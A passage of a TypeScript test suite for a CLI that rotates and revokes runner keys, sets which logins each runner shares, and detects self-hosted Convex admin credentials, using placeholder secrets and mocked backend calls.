      if (fn === 'sync:runnersList') return ((await post(kind, fn, args)) as { runnerId: string; lastSeenAt: number }[]).map((r) => (r.runnerId === 'oldmac000001' ? { ...r, lastSeenAt: now - 60 * 86_400_000 } : r));
      return post(kind, fn, args);
    },
  };
  let rotatingNow = false;
  // Starting refuses, naming cloud and what to run, and changes nothing.
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], { keysChecked: true }, deps), 1);
  const said = s.printed.join('\n');
  assert.match(said, /befe8df8975c/);
  assert.match(said, /tb runner add "befe8df8975c-name" --ssh <host> --id befe8df8975c --replace/);
  assert.doesNotMatch(said, /cb921b2447ea/, 'bruce has its own key');
  assert.doesNotMatch(said, /oldmac000001/, 'not seen for 30 days');
  assert.match(said, /--lock-out befe8df8975c/);
  assert.deepEqual(s.convexCalls, []);
  // --lock-out naming it goes ahead.
  s.printed.length = 0;
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], { keysChecked: true, lockOut: ['befe8df8975c'] }, deps), 0);
  assert.equal(s.convexCalls.length, 1);
  // --finish checks again: without --lock-out it refuses and sets nothing.
  rotatingNow = true;
  s.printed.length = 0;
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], { finish: true }, deps), 1);
  assert.match(s.printed.join('\n'), /befe8df8975c/);
  assert.equal(s.convexCalls.length, 1);
  // A --lock-out for some other runner doesn't count.
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], { finish: true, lockOut: ['cb921b2447ea'] }, deps), 1);
  assert.equal(s.convexCalls.length, 1);
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], { finish: true, lockOut: ['befe8df8975c'] }, deps), 0);
  assert.deepEqual((s.convexCalls as { args: string[] }[]).slice(1).map((c) => c.args.join(' ')), ['env set RUNNER_KEY', 'env remove RUNNER_KEY_NEXT']);
  assert.match(s.printed.join('\n'), /Locked out.*befe8df8975c/);
});

// A runner whose key was revoked keeps its heartbeat row. Only one seen
// after the revoke can be on the main key (a revoked key is refused).
test("rotate-owner doesn't count a runner whose key was revoked and hasn't been seen since", async () => {
  const s = setup(undefined, ['revoked00001', 'revoked00002']);
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
  s.keys([]);
  const seen = Date.parse('2026-11-05T10:00:00Z');
  const post = s.deps.post;
  const deps = {
    ...s.deps,
    now: () => seen + 60_000,
    post: async (kind: string, fn: string, args: Record<string, unknown>) => {
      if (fn === 'sync:listRunnerKeys')
        return {
          keys: [
            { runnerId: 'revoked00001', name: 'a', createdAt: '2026-11-01T00:00:00Z', revokedAt: '2026-11-05T10:00:30Z' },
            { runnerId: 'revoked00002', name: 'b', createdAt: '2026-11-01T00:00:00Z', revokedAt: '2026-11-05T09:00:00Z' },
          ],
          rotating: false,
        };
      return post(kind, fn, args);
    },
  };
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], { keysChecked: true }, deps), 1);
  const said = s.printed.join('\n');
  assert.doesNotMatch(said, /revoked00001/, 'last seen before its key was revoked');
  assert.match(said, /revoked00002/, 'seen an hour after its key was revoked: on the main key');
});

// Gautam's 6 Nov 2026 convex scan, F1 and F3: which logins a runner key's
// runner shares is the main Mac's word, set here, never its own rows'.
test('tb runner logins sets exactly the logins given, or none, and lists what each says beside what it shares', async () => {
  const s = setup();
  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea', 'claude:mike@example.com,codex:mike@example.com'], {}, s.deps), 0);
  assert.deepEqual(s.calls.at(-1), { fn: 'sync:setRunnerLogins', args: { key: 'owner-key', runnerId: 'cb921b2447ea', logins: [{ provider: 'claude', email: 'mike@example.com' }, { provider: 'codex', email: 'mike@example.com' }] } });
  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea', 'none'], {}, s.deps), 0);
  assert.deepEqual(s.calls.at(-1)?.args.logins, []);
  // Nothing given, or not provider:email: refused before asking.
  const before = s.calls.length;
  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea'], {}, s.deps), 1);
  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea', 'mike@example.com'], {}, s.deps), 1);
  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'any', 'claude:mike@example.com'], {}, s.deps), 1);
  assert.equal(s.calls.length, before);
  s.printed.length = 0;
  assert.equal(await runnerKeysCommand(s.cfg, ['logins'], {}, s.deps), 0);
  const out = s.printed.join('\n');
  assert.match(out, /shares: +claude:mike@example\.com/);
  assert.match(out, /says it has: claude:mike@example\.com, claude:guess@/);
  assert.equal(out.includes('\u001b'), false, 'what that Mac wrote prints with no escapes');
});

// A self-hosted backend (docs/self-hosting.md): its admin key is an admin
// credential like a deploy key, and its website address goes to a Mac
// joining it, which can't work it out from the URL.
const SELF_HOSTED_ENV = 'CONVEX_SELF_HOSTED_URL=http://127.0.0.1:13210\nCONVEX_SELF_HOSTED_ADMIN_KEY=convex-self-hosted|secret\n';

test('tb runner check counts a self-hosted admin key, here or on another Mac', async () => {
  const s = setup();
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-key'), 'tbr_mine\n');
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-self-hosted.env'), SELF_HOSTED_ENV);
  assert.equal(await runnerKeysCommand(s.cfg, ['check'], {}, s.deps), 1);
  assert.match(s.printed.join('\n'), /convex-self-hosted\.env/);
  assert.match(s.printed.join('\n'), /instance secret/);
  assert.doesNotMatch(s.printed.join('\n'), /convex-self-hosted\|secret/);
  assert.match(REMOTE_ADMIN_CHECK, /convex-self-hosted\.env" \] && echo self-hosted-env/);
  const r = setup(undefined, [], ['self-hosted-env']);
  assert.equal(await runnerKeysCommand(r.cfg, ['check'], { ssh: 'bruce' }, r.deps), 1);
  assert.match(r.printed.join('\n'), /convex-self-hosted\.env/);
});

test("tb runner add gives a new Mac a self-hosted backend's website address too", async () => {
  const site = 'https://mac.tail1.ts.net:3211';
  const url = 'https://mac.tail1.ts.net:3210';
  const s = setup({ sync: { name: 'new' } });
  const cfg = { ...s.cfg, sync: { ...s.cfg.sync, url, site } };
  assert.equal(await runnerKeysCommand(cfg, ['add', 'new'], { ssh: 'new' }, s.deps), 0);
  const json = JSON.parse(s.sshCalls.find((c) => c.command.includes('runner.json.new'))!.input!);
  assert.equal(json.sync.url, url);
  assert.equal(json.sync.site, site);
  // A Mac that already has its id and URL but no site (or an old one) gets it too, its id kept.
  for (const old of [undefined, 'https://old.tail1.ts.net:3211']) {
    const r = setup({ sync: { name: 'bruce', url, runnerId: 'cb921b2447ea', ...(old ? { site: old } : {}) } });
    assert.equal(await runnerKeysCommand(cfg, ['add', 'bruce'], { ssh: 'bruce' }, r.deps), 0);
    const written = JSON.parse(r.sshCalls.find((c) => c.command.includes('runner.json.new'))!.input!);
    assert.deepEqual(written.sync, { name: 'bruce', url, runnerId: 'cb921b2447ea', site });
  }
});

test("rotate-owner on a self-hosted backend goes ahead without a deploy-key list, and says why", async () => {
  const s = setup();
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-self-hosted.env'), SELF_HOSTED_ENV);
  s.keys(undefined);
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], {}, s.deps), 0);
  assert.match(s.printed.join('\n'), /can't be listed/);
  assert.equal(s.convexCalls[0]?.args.join(' '), 'env set RUNNER_KEY_NEXT');
  // With no admin credential at all, nothing happens.
  const n = setup();
  assert.equal(await runnerKeysCommand(n.cfg, ['rotate-owner'], {}, n.deps), 1);
  assert.deepEqual(n.convexCalls, []);
});
